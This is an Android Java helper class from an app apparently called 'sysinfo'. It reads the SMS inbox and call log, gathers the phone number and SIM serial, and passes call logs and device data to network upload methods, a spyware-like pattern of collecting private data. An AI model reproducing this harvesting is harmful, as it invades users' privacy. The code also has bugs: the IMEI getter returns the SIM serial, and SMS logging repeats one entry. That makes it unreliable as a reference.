package com.sidhit.sysinfo.src;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.sidhit.sysinfo.src.model.CallLogData;
import com.sidhit.sysinfo.src.model.DeviceData;
import com.sidhit.sysinfo.src.model.SMSData;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * Created by hitenpratap on 26/01/17.
 */

public class HelperMethod {

    public static void getListOfSMSReceived(ContentResolver contentResolver, Activity activity) {
        List<SMSData> smsDataList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor c = contentResolver.query(uri, null, null, null, null);
        activity.startManagingCursor(c);

        // Read the sms data and store it in the list
        if (c.moveToFirst()) {
            for (int i = 0; i < c.getCount(); i++) {
                SMSData sms = new SMSData();
                sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                smsDataList.add(sms);

                c.moveToNext();
            }
        }
        c.close();
        for (int i = 0; i < 5; i++) {
            Log.d("Body", smsDataList.get(0).getBody());
            Log.d("Number", smsDataList.get(0).getNumber());
            System.out.println("**************************************");
        }
    }

    public static void getListOfCallLog(ContentResolver contentResolver, Activity activity) {
        List<CallLogData> callLogDataList = new ArrayList<>();
        Uri uri = Uri.parse("content://call_log/calls");
        Cursor c = contentResolver.query(uri, null, null, null, null);
        activity.startManagingCursor(c);

        // Read the sms data and store it in the list
        if (c.moveToFirst()) {
            for (int i = 0; i < c.getCount(); i++) {
                CallLogData callLogData = new CallLogData();
                callLogData.setId(c.getString(c.getColumnIndexOrThrow(CallLog.Calls._ID)));
                callLogData.setDateTime(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
                callLogData.setNumber(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                callLogData.setDuration(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                int dircode = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        callLogData.setCallType(Enums.CallType.OUTGOING);
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        callLogData.setCallType(Enums.CallType.INCOMING);
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callLogData.setCallType(Enums.CallType.MISSED);
                        break;
                }
                callLogDataList.add(callLogData);
                c.moveToNext();
            }
        }
        c.close();
        NetworkUtil.sendCallLogData(activity.getApplicationContext(), callLogDataList);
//        for (int i = 0; i < callLogDataList.size(); i++) {
//            Log.d("Dated", callLogDataList.get(i).getDateTime().toString());
//            Log.d("Number", callLogDataList.get(i).getNumber());
//            Log.d("Duration", callLogDataList.get(i).getDuration());
//            Log.d("Type", callLogDataList.get(i).getCallType().name());
//            System.out.println("**************************************");
//        }
    }

    public static Boolean askForPermission(String permission, Integer requestCode, Context context, Activity activity) {
        if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)) {
                //This is called if user has denied the permission before
                //In this case I am just asking the permission again
                ActivityCompat.requestPermissions(activity, new String[]{permission}, requestCode);
            } else {
                ActivityCompat.requestPermissions(activity, new String[]{permission}, requestCode);
            }
        } else {
            Toast.makeText(activity, "" + permission + " is already granted.", Toast.LENGTH_SHORT).show();
        }
        return Boolean.TRUE;
    }

    public static void getDeviceData(Context context) {
        DeviceData deviceData = new DeviceData();
        deviceData.setDeviceName(Build.MODEL);
        deviceData.setPrimaryPhoneNumber(getPhoneNumber(context));
        deviceData.setSimSerialNumber(getSIMSerialNumber(context));
        deviceData.setIMEINumber(getIMEINumber(context));
        NetworkUtil.sendDeviceData(context, deviceData);
    }

    private static String getPhoneNumber(Context context) {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getLine1Number();
    }

    private static String getSIMSerialNumber(Context context) {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getSimSerialNumber();
    }

    private static String getIMEINumber(Context context) {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getSimSerialNumber();
    }

    public static String getUniqueDeviceId(Context context) {
        return getIMEINumber(context);
    }

}
